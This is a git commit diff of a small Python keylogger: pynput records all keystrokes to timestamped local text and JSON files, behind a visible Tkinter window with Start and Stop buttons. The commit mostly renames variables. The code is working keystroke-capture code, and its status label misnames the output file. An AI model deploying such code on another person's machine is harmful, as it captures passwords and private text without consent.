de806adcd20063a4a7e908f5e11dee43d136bfda
rvikr77 <94057204+rvikr77@users.noreply.github.com>
2024-04-16 23:04:56 +0530

    Add files via upload

--- keylogger.py
+++ keylogger.py
@@ -4,76 +4,69 @@ from pynput import keyboard
 import json
 import time
 
-unique_keys_used = []
-flag_unique = False
-unique_keys = ""
+keys = []
+flag = False
+pressed_keys = ""
 timestamp = str(int(time.time()))
 
-def generate_text_log_unique(key):
-    with open(f'unique_key_log_{timestamp}.txt', "w+") as unique_keys_file:
-        unique_keys_file.write(key)
+def log_text(key):
+    with open(f'key_log_{timestamp}.txt', "w+") as log_file:
+        log_file.write(key)
 
-def generate_json_file_unique(unique_keys_used):
-    with open(f'unique_key_log_{timestamp}.json', '+wb') as unique_key_log_file:
-        unique_key_list_bytes = json.dumps(unique_keys_used).encode()
-        unique_key_log_file.write(unique_key_list_bytes)
+def log_json(keys_used):
+    with open(f'key_log_{timestamp}.json', '+wb') as json_log_file:
+        key_list_bytes = json.dumps(keys_used).encode()
+        json_log_file.write(key_list_bytes)
 
-def on_press_unique(key):
-    global flag_unique, unique_keys_used, unique_keys
-    if flag_unique == False:
-        unique_keys_used.append(
-            {'Pressed': f'{key}'}
-        )
-        flag_unique = True
+def on_press(key):
+    global flag, keys, pressed_keys
+    if flag == False:
+        keys.append({'Pressed': f'{key}'})
+        flag = True
 
-    if flag_unique == True:
-        unique_keys_used.append(
-            {'Held': f'{key}'}
-        )
-    generate_json_file_unique(unique_keys_used)
+    if flag == True:
+        keys.append({'Held': f'{key}'})
+    log_json(keys)
 
+def on_release(key):
+    global flag, keys, pressed_keys
+    keys.append({'Released': f'{key}'})
 
-def on_release_unique(key):
-    global flag_unique, unique_keys_used, unique_keys
-    unique_keys_used.append(
-        {'Released': f'{key}'}
-    )
+    if flag == True:
+        flag = False
+    log_json(keys)
 
-    if flag_unique == True:
-        flag_unique = False
-    generate_json_file_unique(unique_keys_used)
+    pressed_keys = pressed_keys + str(key)
+    log_text(str(pressed_keys))
 
-    unique_keys = unique_keys + str(key)
-    generate_text_log_unique(str(unique_keys))
+def start_keylogger():
+    global listener
+    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+    listener.start()
+    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
+    start_button.config(state='disabled')
+    stop_button.config(state='normal')
 
-def start_keylogger_unique():
-    global unique_listener
-    unique_listener = keyboard.Listener(on_press=on_press_unique, on_release=on_release_unique)
-    unique_listener.start()
-    unique_label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'unique_keylogger.txt'")
-    unique_start_button.config(state='disabled')
-    unique_stop_button.config(state='normal')
+def stop_keylogger():
+    global listener
+    listener.stop()
+    label.config(text="Keylogger stopped.")
+    start_button.config(state='normal')
+    stop_button.config(state='disabled')
 
-def stop_keylogger_unique():
-    global unique_listener
-    unique_listener.stop()
-    unique_label.config(text="Keylogger stopped.")
-    unique_start_button.config(state='normal')
-    unique_stop_button.config(state='disabled')
+root = Tk()
+root.title("Keylogger")
 
-root_unique = Tk()
-root_unique.title("Unique Keylogger")
+label = Label(root, text='Click "Start" to begin keylogging.')
+label.config(anchor=CENTER)
+label.pack()
 
-unique_label = Label(root_unique, text='Click "Start" to begin keylogging.')
-unique_label.config(anchor=CENTER)
-unique_label.pack()
+start_button = Button(root, text="Start", command=start_keylogger)
+start_button.pack(side=LEFT)
 
-unique_start_button = Button(root_unique, text="Start", command=start_keylogger_unique)
-unique_start_button.pack(side=LEFT)
+stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
+stop_button.pack(side=RIGHT)
 
-unique_stop_button = Button(root_unique, text="Stop", command=stop_keylogger_unique, state='disabled')
-unique_stop_button.pack(side=RIGHT)
+root.geometry("250x250")
 
-root_unique.geometry("250x250")
-
-root_unique.mainloop()
+root.mainloop()
